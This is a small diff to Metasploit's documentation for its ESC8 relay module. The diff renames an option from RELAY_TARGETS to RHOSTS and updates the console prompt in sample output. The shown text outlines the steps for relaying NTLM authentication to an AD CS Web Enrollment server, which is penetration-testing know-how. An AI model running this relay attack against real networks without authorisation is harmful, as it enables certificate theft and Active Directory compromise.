@@ -10,7 +10,7 @@ on a given template.
     * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host
 2. Start `msfconsole`
 2. Do: `use auxiliary/server/relay/esc8`
-3. Set the `RELAY_TARGETS` option to the AD CS Web Enrollment server
+3. Set the `RHOSTS` option to the AD CS Web Enrollment server
 4. Run the module and wait for a request to be relayed
 
 ## Options
@@ -36,9 +36,9 @@ The template to issue if MODE is SPECIFIC_TEMPLATE.
 ### Version and OS
 
 ```
-msf6 auxiliary(server/relay/esc8) > run
+msf auxiliary(server/relay/esc8) > run
 [*] Auxiliary module running as background job 1.
-msf6 auxiliary(server/relay/esc8) > 
+msf auxiliary(server/relay/esc8) > 
 [*] SMB Server is running. Listening on 0.0.0.0:445
 [*] Server started.
 [*] New request from 192.168.159.129
